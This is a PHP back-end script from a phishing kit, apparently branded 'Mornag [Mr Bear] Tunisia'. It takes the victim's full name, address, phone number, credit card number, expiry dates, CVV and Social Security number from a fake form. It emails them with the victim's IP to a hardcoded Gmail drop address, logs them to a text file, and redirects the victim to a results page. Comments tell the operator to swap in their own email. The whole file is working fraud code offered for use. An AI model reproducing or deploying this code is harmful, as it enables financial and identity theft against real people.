<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Mornag .= "------------+| Mornag [Mr Bear] Tunisia |+------------\n";
$Mornag .= "Full Name                       : ". $_POST['fullname']."\n";
$Mornag .= "address                    : ".$_POST['address']."\n";
$Mornag .= "city             : ".$_POST['city']."\n";
$Mornag .= "state                    : ".$_POST['state']."\n";
$Mornag .= "zipcode                        : ".$_POST['zip_code']."\n";
$Mornag .= "phone                    : ".$_POST['phone']."\n";
$Mornag .= "cc                    : ".$_POST['card_id']."\n";
$Mornag .= "ex                    : ".$_POST['exp_date']."\n";
$Mornag .= "ex2                    : ".$_POST['exp_date2']."\n";
$Mornag .= "c2                    : ".$_POST['cvv']."\n";
$Mornag .= "SSN                    : ".$_POST['SSN']."\n";
$Mornag .= "------------+| Mornag [Mr Bear] Tunisia |+------------\n";
$Mornag .= "Fr0m $ip chek in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "zniko940@gmail.com"; // Change the email ===> Put ur email
$bilsub = "login From that ip $ip";
$bilhead = "From: Login [$ip] <zniko940@gmail.com>"; // You can change the email for better rzl
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$Mornag,$bilhead);
$v = fopen("rz/aralia.txt","a"); // Send rzl in TXT file 
fwrite($v,$Mornag);
fclose($v);

$_SESSION['fullname'] = $_POST['fullname'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['zip_code'] = $_POST['zip_code'];
$_SESSION['secured_card_id'] = "XXXX-XXXX-XXXX-" . substr($_POST['card_id'], -4);
header("Location: result.php"); // Redirecting 
?>